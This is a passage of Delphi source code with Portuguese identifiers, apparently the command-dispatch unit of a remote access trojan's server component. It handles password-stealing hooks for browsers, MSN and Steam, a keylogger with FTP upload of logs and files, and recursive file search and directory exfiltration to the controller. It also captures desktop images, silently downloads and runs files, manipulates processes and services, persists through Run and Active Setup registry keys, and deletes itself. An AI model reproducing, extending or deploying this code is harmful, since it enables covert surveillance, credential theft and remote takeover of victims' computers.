Unit UnitExecutarComandos;

interface

uses
  windows;

Const
  CurrentVersion = 'Software\Microsoft\Windows\CurrentVersion\Run';
  PoliciesKey = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run';
  InstalledComp = 'Software\Microsoft\Active Setup\Installed Components\';
  UNINST_PATH = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall';

type
  TThreadSearch = Class(TObject)
  public
    Diretorio: String;
    Mascara: string;
    constructor Create(pDiretorio, pMascara: string); overload;
end;

type
  TThreadDownloadDir = Class(TObject)
  public
    Diretorio: String;
    constructor Create(pDiretorio: string); overload;
end;

const
  DelimitadorDeImagem = '**********';
  MSNseparador = '##@@##';
var
  ComandoRecebido: string;
  MainInfoBuffer: string;

  MasterCommandThreadId: THandle;
  ShellThreadID: THandle = 0;
  AudioThreadId: THandle = 0;
  ListarChavesRegistro: THandle = 0;
  ListarValoresRegistro: THandle = 0;

  DesktopIntervalo: integer;
  DesktopQuality: integer;
  EixoXDesktop: integer;
  EixoYDesktop: integer;

  WebcamIntervalo: integer;
  WebcamQuality: integer;

  ToSendSearch: string;
  ToDownloadDIR: string;
  SearchID: THandle = 0;
  DownloadDIRId: Thandle = 0;
  MuliDownFile: string;
  MuliDownFileSize: int64;
  swapmouse, blockmouse: boolean;

  LastCommand: integer = 0;

procedure ExecutarComando;
function GetNewIdentificationName(NewName: string): string;
function GetFirstExecution: string;

implementation

uses
  UnitConexao,
  UnitSettings,
  UnitComandos,
  UnitCarregarFuncoes,
  UnitDiversos,
  UnitServerUtils,
  UnitKeylogger,
  SocketUnit,
  DeleteUnit,
  UnitVariaveis,
  UnitShell,
  Messages,
  UnitWebcam,
  ListarProgramas,
  UnitListarProcessos,
  UnitServicos,
  UnitClipboard,
  UnitRegistro,
  UnitSteamStealer,
  UnitServerOpcoesExtras,
  UnitListarPortasAtivas,
  UnitInformacoes,
  APIWindow,
  APIControl,
  uFTP,
  ActiveX,
  UnitJanelas,
  ListarDispositivos,
  UnitFileManager,
  untCapFuncs,
  UnitAudio,
  StreamUnit,
  UnitDebug;

type
  RecordSearchResult = record
    Find: TWin32FindData;
    TipoDeArquivo: shortString;
    Dir: shortString;
end;

///////// CHAT //////////
var
  MainWnd: TSDIMainWindow;
  Memo1: TAPIMemo;
  Edit1: TAPIEdit;
  Button1: TAPIButton;
  CheckHWND: cardinal;
  Sairdochat: boolean = false;
var
  ServerName, ClientName: string;
  Envia, Enviou, ButtonCaption: string;
  FormCaption: string;
  FontName: string;
  FontSize: cardinal;
  MainColor,
  MemoColor,
  EditColor,
  MemoTextColor,
  EditTextColor: cardinal;
  MensagemCHATRecebida: string;
  BlockMouseHandle: THandle;

function GetFirstExecution: string;
var
  tempstr: string;
begin
  result := lerreg(HKEY_CURRENT_USER, pchar('SOFTWARE\' + Identificacao), pchar('FirstExecution'), '');
  if result = '' then
  begin
    tempstr := getday + '/' + getmonth + '/' + getyear + ' -- ' + gethour + ':' + GetMinute;
    Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + Identificacao, 'FirstExecution', tempstr);
  end;
end;

function EnviarArquivoFTP(FTPAddress,
                          FTPUser,
                          FTPPass: string; FTPPort: integer;
                          Thefile: string): boolean;
var
  ftp: tFtpAccess;
  filedata: string; // buffer do arquivo
  c: cardinal;
  FTPFilename: string;
begin
  Result := false;
  filedata := lerarquivo(Thefile, c);
  if filedata = '' then exit;
  FTPFilename := NewIdentification + '_' + ExtractDiskSerial(myrootfolder) + '_' + extractfilename(Thefile);

  ftp := tFtpAccess.create(FTPAddress,
                           FTPUser,
                           FTPPass,
                           FTPPort);
  if (not assigned(ftp)) or (not ftp.connected) then
  begin
    ftp.Free;
    exit;
  end;

  if ftp.SetDir('./') = false then
  begin
    ftp.Free;
    exit;
  end;

  // Enviando arquivo
  if not ftp.Putfile(FileData, FTPFilename) then
  begin
    ftp.Free;
    exit;
  end;

  if ftp.FileSize(FTPFilename) = MyGetFileSize(Thefile) then result := true;
  ftp.free;
end;

procedure DefinirHandle;
var
  Msg: TMsg;
  X: THandle;
begin
  X := 0;
  while (Sairdochat = false) and
        (ClientSocket.Connected = true) do
  begin
    if MainWnd <> nil then X := MainWnd.Handle;
    _ProcessMessages;
  end;
end;

procedure CheckMSG;
var
  Msg: TMsg;
begin
  sleep(500);
  while (Sairdochat = false) and
        (ClientSocket.Connected = true) do
  begin
    if (MensagemCHATRecebida <> '') and (MainWnd <> nil) then
    begin
      memo1.Text := Memo1.Text + ClientName + ' ' + Enviou + #13#10 + MensagemCHATRecebida + #13#10 + #13#10;
      MensagemCHATRecebida := '';
      memo1.Scroll(memo1.LineCount);
      MainWnd.Center;
      SetWindowPos(MainWnd.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOACTIVATE or SWP_NOMOVE or SWP_NOSIZE);
      if (getforegroundwindow <> MainWnd.Handle) then setforegroundwindow(MainWnd.Handle);
    end;
    _ProcessMessages;
  end;
end;

procedure Button1Click(var Msg: TMessage);
begin
  _EnviarStream(ClientSocket, CHATMSG + '|' + Edit1.Text + '|');
  memo1.Text := Memo1.Text + ServerName + ' ' + Envia + ' ---> ' + ClientName + #13#10 + Edit1.Text + #13#10 + #13#10;
  Edit1.Text := '';
end;

procedure ChangeTextFont(HWND: cardinal; FontName: string; size: integer = 11);
var
  hFont: cardinal;
begin
  { ** Create Font ** }
  hFont := CreateFont(-size, 0, 0, 0, 400, 0, 0, 0, DEFAULT_CHARSET,
                      OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                      DEFAULT_PITCH or FF_DONTCARE, pchar(FontName));
  { Change fonts }
  if hFont <> 0 then SendMessage(HWND, WM_SETFONT, hFont, 0);
end;

procedure MainDestroy(var Msg: TMessage);
begin
  Sairdochat := true;
  //PostQuitMessage(0);
end;
///////// CHAT END  ////////


var
  WebcamCS: TClientSocket;
  DesktopCS: TClientSocket;
  cadena: string;

function WindowsList: string;
  function EnumWindowProc(Hwnd: HWND; i: integer): boolean; stdcall;
  var
    Titulo : string;
  begin
    if (Hwnd=0) then
    begin
      result := false;
    end
    else
    begin
      SetLength(Titulo, 255);
      SetLength(Titulo, GetWindowText(Hwnd, PChar(Titulo), Length(Titulo)));
      if IsWindowVisible(Hwnd) and (Titulo <> '')  then
      begin
        Cadena := Cadena + Titulo + '|' + IntToStr(Hwnd) + '|';
      end else
      if (IsWindowVisible(Hwnd) = false) and (Titulo <> '')  then
      begin
        Cadena := Cadena + '*@*@' + Titulo + '|' + IntToStr(Hwnd) + '|';
      end;
      Result := true;
    end;
  end;
begin
  Cadena := '';
  EnumWindows(@EnumWindowProc, 0);
  result := cadena;
end;

procedure DownloadSelected;
var
  TempStr: string;
  TempInt: int64;
begin
  TempStr := MuliDownFile;
  TempInt := MuliDownFileSize;
  EnviarArquivo(ClientSocket, FILEMANAGER + '|' + DOWNLOAD + '|' + TempStr + '|', TempStr, TempInt, 0);
end;

procedure DownloadRecSelected;
var
  TempStr: string;
  TempInt: int64;
begin
  TempStr := MuliDownFile;
  TempInt := MuliDownFileSize;
  EnviarArquivo(ClientSocket, FILEMANAGER + '|' + DOWNLOADREC + '|' + extractfilepath(TempStr) + '|' + TempStr + '|', TempStr, TempInt, 0);
end;

function PossoMexerNoArquivo(Arquivo: string): boolean;
var
  HFileRes: HFile;
begin
  result := true;
  HFileRes := CreateFile(PChar(Arquivo),
                         GENERIC_READ,
                         0,
                         nil,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         0);

  if HFileRes = INVALID_HANDLE_VALUE then result := false;
  CloseHandle(HFileRes);
end;

procedure FileSearch(const PathName, FileName : string; const InDir : boolean);
var
  Rec: TSearchRec;
  Path, Tempdir: string;
  tamanho: int64;
  Tipo, FileDate: string;
  RSR: RecordSearchResult;
  ResultStream: TMemoryStream;
  TempFile: string;
begin
  path := PathName;

  if copy(path, 1, pos('?', path) - 1) = 'ALL' then
  begin
    Tempdir := path;
    delete(tempdir, 1, pos('?', Tempdir));
    while pos('?', Tempdir) > 0 do
    begin
      sleep(50);
      try
        FileSearch(copy(Tempdir, 1, pos('?', Tempdir) - 1), FileName, TRUE);
        except
      end;
      delete(tempdir, 1, pos('?', Tempdir));
    end;
    exit;
  end;

  if path[length(path)] <> '\' then path := path + '\';

  if FindFirst(Path + FileName, faAnyFile - faDirectory, Rec) = 0 then
  try
    repeat
      ResultStream := TMemoryStream.Create;
      RSR.Find := Rec.FindData;
      RSR.TipoDeArquivo := TipoArquivo(Path + string(Rec.FindData.cFileName), extractfileext(string(Rec.FindData.cFileName)));
      RSR.Dir := Path;
      ResultStream.WriteBuffer(RSR, sizeof(RecordSearchResult));
      ToSendSearch := ToSendSearch + StreamToStr(ResultStream);
      ResultStream.Free;

      TempFile := mytempfolder + inttostr(gettickcount) + '.tmp';
      criararquivo(TempFile, '', 0);
      Mydeletefile(TempFile);

    until FindNext(Rec) <> 0;
    finally
      _myFindClose(Rec);
  end;

  If not InDir then Exit;

  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
  try
    repeat
    if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name <> '.') and (Rec.Name <> '..') then
    FileSearch(Path + Rec.Name, FileName, True);
    until FindNext(Rec) <> 0;
    finally
    _myFindClose(Rec);
  end;
end;

procedure FileSearchDownloadDir(const PathName: string; const InDir : boolean);
var
  Rec: TSearchRec;
  Path, Tempdir: string;
  tamanho: int64;
  Tipo, FileDate: string;
  TempFile: string;
begin
  path := PathName;
  if path[length(path)] <> '\' then path := path + '\';

  if FindFirst(Path + '*.*', faAnyFile - faDirectory, Rec) = 0 then
  try
    repeat

      if length(Path + Rec.Name) > 3 then // porque c:\ tem tamanho 3 hehe
        ToDownloadDIR := ToDownloadDIR + Path + Rec.Name + '|';

      TempFile := mytempfolder + inttostr(gettickcount) + '.tmp';
      criararquivo(TempFile, '', 0);
      Mydeletefile(TempFile);

    until FindNext(Rec) <> 0;
    finally
      _myFindClose(Rec);
  end;

  If not InDir then Exit;

  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
  try
    repeat
    if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name <> '.') and (Rec.Name <> '..') then
    FileSearchDownloadDir(Path + Rec.Name, True);
    until FindNext(Rec) <> 0;
    finally
    _myFindClose(Rec);
  end;
end;

function FileExistsOnComputer(const PathName, FileName : string; const InDir : boolean; var ArquivoEncontrado: string): boolean;
var
  Rec: TSearchRec;
  Path, Tempdir: string;
  tamanho: int64;
  Tipo, FileDate: string;
  TempFile: string;
begin
  result := false;
  path := PathName;
  ArquivoEncontrado := '';

  if path[length(path)] <> '\' then path := path + '\';

  try
    if FindFirst(Path + FileName, faAnyFile - faDirectory, Rec) = 0 then
    try
      repeat
      if length(Path + Rec.Name) > 3 then
      begin
        result := true;
        ArquivoEncontrado := Path + Rec.Name;
      end;

      TempFile := mytempfolder + inttostr(gettickcount) + '.tmp';
      criararquivo(TempFile, '', 0);
      Mydeletefile(TempFile);

      until (FindNext(Rec) <> 0) or (result = true);
      finally
        _myFindClose(Rec);
    end;
    except
  end;
  If not InDir then Exit;

  try
    if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
    try
      repeat
      if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name <> '.') and (Rec.Name <> '..') then
      begin
        result := FileExistsOnComputer(Path + Rec.Name, FileName, True, ArquivoEncontrado);
      end;
      until (FindNext(Rec) <> 0) or (result = true);
      finally
      _myFindClose(Rec);
    end;
    except
  end;
end;

constructor TThreadSearch.Create(pDiretorio, pMascara: string);
begin
  Diretorio := pDiretorio;
  Mascara := pMascara;
end;

constructor TThreadDownloadDir.Create(pDiretorio: string);
begin
  Diretorio := pDiretorio;
end;

function GetDrives2: String;
var
  Drives: array[0..104] of Char;
  pDrive: PChar;
begin
  GetLogicalDriveStrings(104, Drives);
  pDrive := Drives;
  while pDrive^ <> #0 do
  begin
    Result := Result + pDrive + '|';
    Inc(pDrive, 4);
  end;
end;

function CountChars(char, str: string): integer;
var
  i: integer;
begin
  result := 0;
  if str = '' then exit;
  if pos(char, str) <= 0 then exit;
  i := 1;
  for i := 1 to length(str) do
  begin
    if str[i] = char then inc(result, 1);
  end;
end;

var
  xxxArquivo: string;
  xxxDir: string;

procedure EnviarArqDownDir;
var
  TempStr, TempDir, s: string;
  TempInt: int64;
begin
  TempStr := xxxArquivo;
  TempDir := xxxDir;
  TempInt := MyGetFileSize(TempStr);
  s := extractfilepath(TempStr);

  if tempdir[length(tempdir)] <> '\' then tempdir := tempdir + '\';
  if s[length(s)] <> '\' then s := s + '\';
  s := replacestring(TempDir, '', s);

  while CountChars('\', TempDir) > 1 do delete(TempDir, 1, pos('\', TempDir));
  TempDir := TempDir + s;

  if (fileexists(Tempstr) = true) and (TempInt > 0) and (PossoMexerNoArquivo(Tempstr) = true) then
  EnviarArquivo(ClientSocket, FILEMANAGER + '|' + DOWNLOADREC + '|' + tempdir + '|' + TempStr + '|', TempStr, TempInt, 0, false);
  xxxArquivo := '';
end;

procedure DownloadDirStart(P: Pointer);
var
  ThreadDownloadDir : TThreadDownloadDir;
  TempStr, TempStr1, Tosend, ClientDir: string;
begin
  ThreadDownloadDir := TThreadDownloadDir(P);
  ClientDir := ThreadDownloadDir.Diretorio;
  FileSearchDownloadDir(ClientDir, TRUE);

  TempStr := ToDownloadDIR;
  ToDownloadDIR := '';

  if TempStr <> '' then
  begin
    While TempStr <> '' do
    begin
      TempStr1 := Copy(TempStr, 1, pos('|', TempStr) - 1);
      delete(TempStr, 1, pos('|', TempStr));

      xxxArquivo := TempStr1;
      xxxDir := ClientDir;

      StartThread(@EnviarArqDownDir);
      while xxxArquivo <> '' do sleep(100);
    end;
  end;
end;

procedure ProcurarArquivo(P: Pointer);
var
  ThreadSerarch : TThreadSearch;
  TempStr, TempStr1, TempStr2, Tosend: string;
begin
  ThreadSerarch := TThreadSearch(P);
  FileSearch(ThreadSerarch.Diretorio, ThreadSerarch.Mascara, TRUE);

  TempStr := ToSendSearch;
  ToSendSearch := '';

  if TempStr <> '' then
  begin
    ToSend := FILEMANAGER + '|' + PROCURAR_ARQ + '|' + TempStr;
    _EnviarStream(ClientSocket, ToSend);
  end else
  begin
    ToSend := FILEMANAGER + '|' + PROCURARERROR + '|';
    _EnviarStream(ClientSocket, ToSend);
  end;
end;

function GerarRelatorioConfig: string;
var
  i: integer;
begin
  for i := 0 to 19 do if length(variaveis[i]) > 1 then result := result + variaveis[i] + '|';
  result := result + '#';
  result := result + GetNewIdentificationName('') + '|';
  result := result + senha + '|';
  result := result + serverfilename + '|';
  result := result + paramstr(0) + '|';
  if (HKLM <> '') and (InstalarServidor = true) then result := result + HKLM + '|' else result := result + ' |';
  if (HKCU <> '') and (InstalarServidor = true) then result := result + HKCU + '|' else result := result + ' |';
  if (UnitSettings.ActiveX <> '') and (InstalarServidor = true) then result := result + UnitSettings.ActiveX + '|' else result := result + ' |';
  if (Policies <> '') and (InstalarServidor = true) then result := result + Policies + '|' else result := result + ' |';
  result := result + variaveis[59] + '|';
  result := result + variaveis[60] + '|';
  result := result + variaveis[61] + '|';
  result := result + variaveis[63] + '|';
  result := result + MutexName + '|';
  if ExibirMensagem = true then
  begin
    result := result + variaveis[33] + ' |';
    result := result + variaveis[34] + ' |';
  end else
  begin
    result := result + ' |';
    result := result + ' |';
  end;
  result := result + variaveis[35] + '|';
  result := result + variaveis[37] + '|';
  if (keyloggerativo = false) or (EnviarPorFTP = false) then
  begin
    result := result + ' |';
    result := result + ' |';
    result := result + ' |';
    result := result + ' |';
    result := result + ' |';
    result := result + ' |';
  end else
  begin
    result := result + variaveis[38] + '|';
    result := result + variaveis[39] + '|';
    result := result + variaveis[41] + '|';
    result := result + variaveis[42] + '|';
    result := result + variaveis[43] + '|';
    result := result + variaveis[44] + '|';
  end;

  result := result + variaveis[45] + '|';
  result := result + variaveis[46] + '|';
  result := result + variaveis[47] + '|';
  result := result + variaveis[48] + '|';
  result := result + variaveis[49] + '|';
  result := result + variaveis[50] + '|';
  result := result + variaveis[51] + '|';
  result := result + variaveis[52] + '|';
  result := result + variaveis[53] + '|';
  result := result + variaveis[54] + '|';
  result := result + variaveis[55] + '|';
  result := result + variaveis[56] + '|';

  result := result + variaveis[70] + '|';
  if variaveis[71] <> '' then result := result + variaveis[71] + '|' else result := result + ' |';
  if variaveis[72] <> '' then result := result + 'TRUE' + '|' else result := result + 'FALSE' + '|';
end;

function GetNewIdentificationName(NewName: string): string;
var
  tempstr: string;
begin
  if NewName <> '' then
  begin
    if Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + Identificacao, 'NewIdentification', NewName) = true then
    result := NewName else result := Identificacao;
    exit;
  end;
  result := lerreg(HKEY_CURRENT_USER, pchar('SOFTWARE\' + Identificacao), pchar('NewIdentification'), '');
  if result = '' then
  begin
    tempstr := getday + '/' + getmonth + '/' + getyear + ' -- ' + gethour + ':' + GetMinute;
    Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + Identificacao, 'NewIdentification', Identificacao);
  end;
end;

procedure DesinstalarServer;
var
  InstallKey: HKEY;
  TempMutex: THandle;
begin
  ExitMutex := CreateMutex(nil, False, pchar(MutexName + '_SAIR'));

  if ShellThreadID <> 0 then
  begin
    ShellGetComando('exit');
    sleep(100);
    ShellGetComando('');
    //closethread(ShellThreadID);
    ShellThreadID := 0;
  end;

  CloseHandle(KeyloggerThread);
  CloseHandle(MainMutex);

  SetFileAttributes(PChar(extractfilepath(ServerFileName)), FILE_ATTRIBUTE_NORMAL);
  MyDeleteFile(LogsFile);

  if HKLM <> '' then
  begin
    regopenkey(HKEY_LOCAL_MACHINE, CurrentVersion, InstallKey);
    RegDeleteValue(InstallKey, pchar(HKLM));
    regclosekey(InstallKey);
  end;
  if HKCU <> '' then
  begin
    regopenkey(HKEY_CURRENT_USER, CurrentVersion, InstallKey);
    RegDeleteValue(InstallKey, pchar(HKCU));
    regclosekey(InstallKey);
  end;
  if Policies <> '' then
  begin
    regopenkey(HKEY_CURRENT_USER, PoliciesKey, InstallKey);
    RegDeleteValue(InstallKey, pchar(Policies));
    regclosekey(InstallKey);
    regopenkey(HKEY_LOCAL_MACHINE, PoliciesKey, InstallKey);
    RegDeleteValue(InstallKey, pchar(Policies));
    regclosekey(InstallKey);
  end;
  if UnitSettings.activeX <> '' then
  begin
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, InstalledComp, 0, KEY_WRITE, InstallKey);
    RegDeleteKey(InstallKey, pchar(UnitSettings.activeX));
    RegCloseKey(InstallKey);

    RegOpenKeyEx(HKEY_CURRENT_USER, InstalledComp, 0, KEY_WRITE, InstallKey);
    RegDeleteKey(InstallKey, pchar(UnitSettings.activeX));
    RegCloseKey(InstallKey);
  end;

  RegOpenKeyEx(HKEY_CURRENT_USER, 'Software\', 0, KEY_WRITE, InstallKey);
  RegDeleteKey(InstallKey, pchar(Identificacao));
  RegCloseKey(InstallKey);
end;

procedure SendShift(H: HWnd; Down: Boolean);
var
  vKey, ScanCode, wParam: Word;
  lParam: longint;
begin
  vKey := $10;
  ScanCode := MapVirtualKey(vKey, 0);
  wParam := vKey or ScanCode shl 8;
  lParam := longint(ScanCode) shl 16 or 1;
  if not(Down) then lParam := lParam or $C0000000;
  SendMessage(H, WM_KEYDOWN, vKey, lParam);
end;

procedure SendCtrl(H: HWnd; Down: Boolean);
var
  vKey, ScanCode, wParam: Word;
  lParam: longint;
begin
  vKey := $11;
  ScanCode := MapVirtualKey(vKey, 0);
  wParam := vKey or ScanCode shl 8;
  lParam := longint(ScanCode) shl 16 or 1;
  if not(Down) then lParam := lParam or $C0000000;
  SendMessage(H, WM_KEYDOWN, vKey, lParam);
end;

procedure SendKey(H: Hwnd; Key: char);
var
  vKey, ScanCode, wParam: Word;
  lParam, ConvKey: longint;
  Shift, Ctrl: boolean;
begin
  ConvKey := OemKeyScan(ord(Key));
  Shift := (ConvKey and $00020000) <> 0;
  Ctrl := (ConvKey and $00040000) <> 0;
  ScanCode := ConvKey and $000000FF or $FF00;
  vKey := ord(Key);
  wParam := vKey;
  lParam := longint(ScanCode) shl 16 or 1;
  if Shift then SendShift(H, true);
  if Ctrl then SendCtrl(H, true);
  SendMessage(H, WM_KEYDOWN, vKey, lParam);
  SendMessage(H, WM_CHAR, vKey, lParam);
  lParam := lParam or $C0000000;
  SendMessage(H, WM_KEYUP, vKey, lParam);
  if Shift then SendShift(H, false);
  if Ctrl then SendCtrl(H, false);
end;

procedure sendkeys(recebido: string);
var
  KeyBoard: byte;
begin
  while pos('|', recebido) > 0 do
  begin
    KeyBoard := strtoint(copy(recebido, 1, pos('|', recebido) -1));
    delete(recebido, 1, pos('|', recebido));
    keybd_event(KeyBoard, 1, 0, 0);
    keybd_event(KeyBoard, 1, KEYEVENTF_KEYUP, 0);
  end;
end;

procedure ExecutarComando;
var
  ToSend: string;
  Comando: string;
  CommandThreadId: THandle;
  ThreadId: cardinal;
  PID: cardinal;
  TempStr, TempStr1, TempStr2, TempStr3, TempStr4, tempstr5, tempstr6: string;
  TempInt64, TempInt, TempInt2: int64;
  DeviceClassesCount, DevicesCount: integer;
  NumArrayRegistro: string;
  EixoX, EixoY: integer;
  DC1: HDC;
  Point: TPoint;
  MouseButton: dword;
  DC: HDC;
  delay: integer;
  Key: char;
  Msg: TMsg;
  ThreadInfoAudio: TThreadInfoAudio;
  ThreadSearch: TThreadSearch;
  ThreadDownloadDir: TThreadDownloadDir;
  DeletouArq, DeletouDir: boolean;
  MSN, FIREFOX, IELOGIN, IEPASS, IEAUTO, IEWEB, NOIP, FF3_5, STEAM, CHROME: string;
  c: cardinal;
  TempMutex: cardinal;
  i: integer;
  H: THandle;
  TempFile: string;
  Tentativa: integer;
begin
  //TempFile := mytempfolder + inttostr(gettickcount) + '.tmp';
  //criararquivo(TempFile, '', 0);
  //Mydeletefile(TempFile);
  processmessages;
  
  Comando := ComandoRecebido;
  CommandThreadId := MasterCommandThreadId;

  while gettickcount < LastCommand + 2 do processmessages;
  LastCommand := Gettickcount;

  LastPing := gettickcount;

  if copy(Comando, 1, pos('|', Comando) - 1) = MAININFO then
  begin
    delete(comando, 1, pos('|', Comando));
    if copy(Comando, 1, pos('|', Comando) - 1) <> senha then
    begin
      ClientSocket.Disconnect(erro17);
      AddDebug(erro3);
      CloseHandle(CommandThreadId);
      exit;
    end;
    delete(comando, 1, pos('|', Comando));
    RandomStringClient := copy(Comando, 1, pos('|', Comando) - 1);

    if NewIdentification = '' then NewIdentification := Identificacao;
    ToSend := ListarMAININFO(NewIdentification, ClientSocket.LocalAddress, Versao, inttostr(ClientSocket.RemotePort), GetFirstExecution);
    MainInfoBuffer := ToSend;

    _EnviarStream(ClientSocket, ToSend + GerarRelatorioConfig);

    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = IMGDESK then
  begin
    // aqui no futuro eu posso implementar para o cliente escolher o tamanho da imagem
    ToSend := GetDesktopImage(90, 130, 130);
    _EnviarStream(ClientSocket, IMGDESK + '|' + ToSend);
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DISCONNECT then
  begin
    ExitMutex := CreateMutex(nil, False, pchar(MutexName + '_SAIR'));
    CloseHandle(MainMutex);

    ClientSocket.Disconnect(erro18);
    AddDebug(erro4);
    GetWindowThreadProcessId(FindWindow('shell_traywnd', nil), @PID);

    if PID <> getcurrentprocessid then
    begin
      sleep(10000);
      exitprocess(0);
    end else
    begin
      FinalizarServidor := true;
      sleep(10000); // tempo para todos os processos verificarem o mutex_sair
      // aqui eu preciso fachar o handle pq o processo não será finalizado
      CloseHandle(ExitMutex);
      exit;
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = UNINSTALL then
  begin
    DesinstalarServer;

    ClientSocket.Disconnect(erro19);
    AddDebug(erro5);
    GetWindowThreadProcessId(FindWindow('shell_traywnd', nil), @PID);

    if PID <> getcurrentprocessid then
    begin
      if paramstr(0) <> ServerFileName then MyDeleteFile(ServerFileName) else DeletarSe;
      sleep(10000);
      exitprocess(0);
    end else
    begin
      if paramstr(0) <> ServerFileName then MyDeleteFile(ServerFileName) else DeletarSe;
      FinalizarServidor := true;
      sleep(10000); // tempo para todos os processos verificarem o mutex_sair
      // aqui eu preciso fachar o handle pq o processo não será finalizado
      CloseHandle(ExitMutex);
      exit;
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = RENAMESERVIDOR then
  begin
    delete(comando, 1, pos('|', Comando));
    NewIdentification := copy(Comando, 1, pos('|', Comando) - 1);
    NewIdentification := GetNewIdentificationName(NewIdentification);
    _EnviarStream(ClientSocket, RENAMESERVIDOR + '|' + NewIdentification + '|');
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = UPDATESERVIDOR then
  begin
    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    delete(comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(comando, 1, pos('|', Comando));
    TempStr2 := MyTempFolder + inttostr(gettickcount) + '_' + ExtractFileName(TempStr1);
    if ReceberArquivo(ClientSocket, TempStr + '|' + TempStr1 + '|', TempStr2) then
    begin
      if fileexists(TempStr2) = false then
      begin
        _EnviarStream(ClientSocket, UPDATESERVERERROR + '|');
        exit;
      end;

      TempMutex := CreateMutex(nil, False, '_x_X_UPDATE_X_x_');
      if MyShellExecute(0, 'open', pchar(TempStr2), nil, nil, SW_NORMAL) <= 32 then
      begin
        closehandle(TempMutex);
        _EnviarStream(ClientSocket, UPDATESERVERERROR + '|');
        exit;
      end;
      sleep(1000);
      closehandle(TempMutex);

      DesinstalarServer;

      ClientSocket.Disconnect(erro20);
      AddDebug(erro6);
      GetWindowThreadProcessId(FindWindow('shell_traywnd', nil), @PID);

      if PID <> getcurrentprocessid then
      begin
        if paramstr(0) <> ServerFileName then MyDeleteFile(ServerFileName) else DeletarSe;
        sleep(10000);
        exitprocess(0);
      end else
      begin
        if paramstr(0) <> ServerFileName then MyDeleteFile(ServerFileName) else DeletarSe;
        FinalizarServidor := true;
        sleep(10000); // tempo para todos os processos verificarem o mutex_sair
        // aqui eu preciso fachar o handle pq o processo não será finalizado
        CloseHandle(ExitMutex);
        exit;
      end;
    end;
  end else

  if (copy(Comando, 1, pos('|', Comando) - 1) = ENVIAREXECNORMAL) or
     (copy(Comando, 1, pos('|', Comando) - 1) = ENVIAREXECHIDDEN) then
  begin
    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    delete(comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(comando, 1, pos('|', Comando));
    TempStr2 := MyTempFolder + inttostr(gettickcount) + '_' + ExtractFileName(TempStr1);
    if ReceberArquivo(ClientSocket, TempStr + '|' + TempStr1 + '|', TempStr2) then
    begin
      if TempStr = ENVIAREXECNORMAL then
      MyShellExecute(0, 'open', pchar(TempStr2), '', nil, SW_NORMAL) else
      MyShellExecute(0, 'open', pchar(TempStr2), '', nil, SW_HIDE);
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTARPROCESSOS then
  begin
    _EnviarStream(ClientSocket, LISTARPROCESSOS + '|' +
                               LISTADEPROCESSOSPRONTA + '|' +
                               inttostr(GetCurrentProcessId) + '|' +
                               ListaDeProcessos);
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = FINALIZARPROCESSO then
  begin
    delete(comando, 1, pos('|', Comando));
    try
      TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
      except
    end;
    if TerminarProceso(TempInt) = true then
    _EnviarStream(ClientSocket, LISTARPROCESSOS + '|' +
                               FINALIZARPROCESSO + '|' +
                               'Y|' +
                               inttostr(TempInt) + '|') else
    _EnviarStream(ClientSocket, LISTARPROCESSOS + '|' +
                               FINALIZARPROCESSO + '|' +
                               'N|' +
                               inttostr(TempInt) + '|');
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTARSERVICOS then
  begin
    _EnviarStream(ClientSocket, LISTARSERVICOS + '|' +
                               LISTADESERVICOSPRONTA + '|' +
                               ServiceList);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = INICIARSERVICO then
  begin
    Delete(Comando, 1, pos('|', Comando));
    ServiceStatus(copy(Comando, 1, pos('|', Comando) - 1), True, True);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = PARARSERVICO then
  begin
    Delete(Comando, 1, pos('|', Comando));
    ServiceStatus(copy(Comando, 1, pos('|', Comando) - 1), True, False);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESINSTALARSERVICO then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    if UninstallService(TempStr) = true then
    begin
      _EnviarStream(ClientSocket, LISTARSERVICOS + '|' +
                                 DESINSTALARSERVICO + '|' +
                                 'Y|' +
                                 TempStr + '|');
    end else
    begin
      _EnviarStream(ClientSocket, LISTARSERVICOS + '|' +
                                 DESINSTALARSERVICO + '|' +
                                 'N|' +
                                 TempStr + '|');
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = INSTALARSERVICO then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));
    TempStr1 := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));
